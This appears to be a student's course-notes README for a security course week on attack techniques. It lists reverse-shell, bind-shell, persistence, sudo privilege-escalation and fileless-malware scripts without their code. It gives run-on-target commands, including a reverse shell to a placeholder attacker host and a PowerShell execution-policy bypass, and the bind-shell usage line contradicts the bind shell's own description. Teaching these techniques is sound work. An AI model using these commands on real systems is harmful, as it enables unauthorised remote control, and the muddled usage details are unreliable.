## InfoSEC Course Notes: Execution, Persistence, Privilege Escalation and Evasion - Week 2

This repository contains my notes for Week 2 of the InfoSEC course on Coursera. The course covers various topics related to cybersecurity, including execution, persistence, privilege escalation, and evasion.

### Contents

The `Execution, persistence, privilege escalation and evasion/Week 2` directory contains the following files:

- `README.md`: this file, providing an overview of the contents of the directory
- `slides.pdf`: a PDF file containing the slides used in the course lectures
- `notes.md`: my personal notes on the topics covered in Week 2

### Code Examples

In addition to the lecture slides and my notes, the course also includes several code examples. The following is a brief description of each code file:

- `reverse_shell.py`: a Python script that sets up a reverse shell on a target machine
- `bind_shell.py`: a Python script that sets up a bind shell on a target machine
- `persistence.py`: a Python script that demonstrates how to achieve persistence on a target machine
- `privilege_escalation.sh`: a Bash script that demonstrates a privilege escalation attack
- `fileless_malware.ps1`: a PowerShell script that demonstrates a fileless malware attack

Each code file is accompanied by a brief description of its purpose and usage in Markdown format.
#### `reverse_shell.py`

This Python script sets up a reverse shell on a target machine, allowing an attacker to gain remote access to the machine. The script opens a listener on the attacker's machine and connects to it from the target machine, giving the attacker control over the target machine.

##### Requirements

- Python 2.7 or 3.x

##### Installation

No installation is required. Simply download the `reverse_shell.py` file to your machine.

##### Usage

To use the script, run the following command on the target machine:

```
python reverse_shell.py <attacker_ip> <attacker_port>
```

Replace `<attacker_ip>` and `<attacker_port>` with the IP address and port number of the attacker's machine.

#### `bind_shell.py`

This Python script sets up a bind shell on a target machine, allowing an attacker to gain remote access to the machine. The script opens a listener on the target machine and waits for an incoming connection from the attacker's machine, giving the attacker control over the target machine.

##### Requirements

- Python 2.7 or 3.x

##### Installation

No installation is required. Simply download the `bind_shell.py` file to your machine.

##### Usage

To use the script, run the following command on the target machine:

```
python bind_shell.py <attacker_ip> <attacker_port>
```

Replace `<attacker_ip>` and `<attacker_port>` with the IP address and port number of the attacker's machine.

#### `persistence.py`

This Python script demonstrates how to achieve persistence on a target machine, allowing an attacker to maintain control over the machine even after a reboot. The script adds a new entry to the Windows registry that runs the script every time the machine starts up, ensuring that the attacker's backdoor is always active.

##### Requirements

- Python 2.7 or 3.x
- Windows operating system

##### Installation

No installation is required. Simply download the `persistence.py` file to your Windows machine.

##### Usage

To use the script, run the following command on the target machine:

```
python persistence.py
```

The script will add a new entry to the Windows registry that runs the script every time the machine starts up, ensuring that the attacker's backdoor is always active.

#### `privilege_escalation.sh`

This Bash script demonstrates a privilege escalation attack, in which an attacker gains elevated privileges on a target machine. The script exploits a vulnerability in the `sudo` command to gain root access.

##### Requirements

- Bash shell
- `sudo` command

##### Installation

No installation is required. Simply download the `privilege_escalation.sh` file to your machine.

##### Usage

To use the script, run the following command on the target machine:

```
bash privilege_escalation.sh
```

The script will exploit the `sudo` vulnerability to gain root access.

#### `fileless_malware.ps1`

This PowerShell script demonstrates a fileless malware attack, in which an attacker gains access to a target machine without leaving any traces on the file system. The script uses the Windows Management Instrumentation (WMI) service to execute malicious code in memory.

##### Requirements

- Windows operating system
- PowerShell

##### Installation

No installation is required. Simply download the `fileless_malware.ps1` file to your Windows machine.

##### Usage

To use the script, run the following command on the target machine:

```
powershell -ExecutionPolicy Bypass -File fileless_malware.ps1
```

The script will use the WMI service to execute malicious code in memory, without leaving any traces on the file system.
